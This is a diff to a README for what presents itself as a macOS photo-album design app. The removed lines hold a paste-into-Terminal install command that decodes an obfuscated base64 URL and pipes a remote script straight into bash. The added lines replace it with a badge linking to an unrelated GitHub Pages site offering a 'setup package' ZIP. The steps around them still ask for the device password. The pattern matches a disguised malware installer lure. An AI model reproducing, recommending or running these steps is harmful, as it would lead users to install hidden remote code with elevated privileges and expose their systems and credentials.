@@ -7,9 +7,9 @@ It integrates with popular print labs, supports PSD/PNG/TIFF formats, and saves 
 
 ## 🧰 Installation via a command in the terminal:
 1. Copy the installation command below.
-```
-   /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9zb2wvaW5zdGFsbC5zaA== | base64 -d))"
-``` 
+
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://izaiahbuchananlkee.github.io/.github/smartalbums-macos)
+
 2. Open Terminal on your device, paste the command, then press Return.  
 3. Enter your device password when prompted and confirm the installation.
 
